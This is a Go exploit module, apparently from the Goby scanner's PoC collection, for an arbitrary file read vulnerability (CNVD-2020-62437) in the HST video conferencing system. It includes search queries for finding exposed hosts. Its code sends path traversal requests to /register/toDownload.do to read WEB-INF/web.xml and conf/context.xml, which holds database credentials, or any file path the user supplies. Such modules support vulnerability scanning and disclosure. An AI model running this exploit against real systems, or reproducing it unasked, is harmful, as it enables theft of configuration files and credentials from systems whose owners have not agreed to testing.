package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HST CVS toDownload.do file reading vulnerability",
    "Description": "<p>Shenzhen Yinpeng Cloud Computing Co., Ltd. was established in September 11, 2013, the company's business scope includes the development and sales of cloud computing technology, computer software, hardware product design, etc.</p><p>There is any file download vulnerability in the video conference system of Shenzhen Yinpeng Cloud Computing Co., LTD. Attackers can use the vulnerability to obtain sensitive information.</p>",
    "Impact": "<p>An attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., through this vulnerability, resulting in an extremely insecure website.</p>",
    "Recommendation": "<p> 1. Filter the incoming parameters before downloading, and directly replace .. with empty, which can simply achieve the purpose of prevention. </p><p>2. Check the downloaded file type to determine whether the download type is allowed. </p><p>3. At present, the manufacturer has not provided the relevant vulnerability patch links, please pay attention to the manufacturer's homepage for updates at any time: <a href=\"http://www.hst.com/\">http://www.hst.com/</a></p>",
    "Product": "HST-VCS",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "好视通视频会议 toDownload.do 文件读取漏洞",
            "Product": "好视通-视频会议",
            "Description": "<p>深圳银澎云计算有限公司于 2013年09月11成立，公司经营范围包括云计算技术的开发与销售、计算机软件、硬件产品的设计等。</p><p>深圳银澎云计算有限公司好视通视频会议系统存在任意文件下载漏洞，攻击者可利用该漏洞获取敏感信息。</p>",
            "Recommendation": "<p> 1、在下载前对传入的参数进行过滤，直接将..替换成空，就可以简单实现防范的目的。</p><p>2、对下载文件类型进行检查，判断是否允许下载类型。</p><p>3、目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页随时更新：<a href=\"http://www.hst.com/\">http://www.hst.com/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "HST CVS toDownload.do file reading vulnerability",
            "Product": "HST-VCS",
            "Description": "<p>Shenzhen Yinpeng Cloud Computing Co., Ltd. was established in September 11, 2013, the company's business scope includes the development and sales of cloud computing technology, computer software, hardware product design, etc.</p><p>There is any file download vulnerability in the video conference system of Shenzhen Yinpeng Cloud Computing Co., LTD. Attackers can use the vulnerability to obtain sensitive information.</p>",
            "Recommendation": "<p> 1. Filter the incoming parameters before downloading, and directly replace .. with empty, which can simply achieve the purpose of prevention. </p><p>2. Check the downloaded file type to determine whether the download type is allowed. </p><p>3. At present, the manufacturer has not provided the relevant vulnerability patch links, please pay attention to the manufacturer's homepage for updates at any time: <a href=\"http://www.hst.com/\">http://www.hst.com/</a></p>",
            "Impact": "<p>An attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., through this vulnerability, resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"fmWeb/other/js/login.js\" || body=\"__CONFIG__OBJ_OEM_ODM_WORD_\" || body=\"fmWeb/other/js/login.js\" || header=\"mldn-session-id\" || banner=\"mldn-session-id\" || title==\"视频会议管理后台\" || cert=\"haoshitong.com\"",
    "GobyQuery": "body=\"fmWeb/other/js/login.js\" || body=\"__CONFIG__OBJ_OEM_ODM_WORD_\" || body=\"fmWeb/other/js/login.js\" || header=\"mldn-session-id\" || banner=\"mldn-session-id\" || title==\"视频会议管理后台\" || cert=\"haoshitong.com\"",
    "Author": "ovi3",
    "Homepage": "http://www.hst.com/",
    "DisclosureDate": "2020-12-11",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2020-62437"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.3",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2020-62437"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "database,custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "../WEB-INF/web.xml",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Hanming-Video-Conferencing"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.5",
    "PostTime": "2023-09-18",
    "PocId": "10191"
}`
	sendPayoadH598160FDSFiuyaooolo := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig("/register/toDownload.do?fileName=" + url.QueryEscape(uri))
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayoadH598160FDSFiuyaooolo(hostInfo, `../WEB-INF/web.xml`)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "<welcome-file>/WEB-INF/pages/other/toLogin.jsp</welcome-file>") && strings.Contains(resp.RawBody, "<web-app ")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			filePath := goutils.B2S(ss.Params["filePath"])
			if attackType == "database" {
				filePath = `../../../conf/context.xml`
			}
			resp, err := sendPayoadH598160FDSFiuyaooolo(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), `attachment;filename=`) {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			} else {
				expResult.Success = false
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
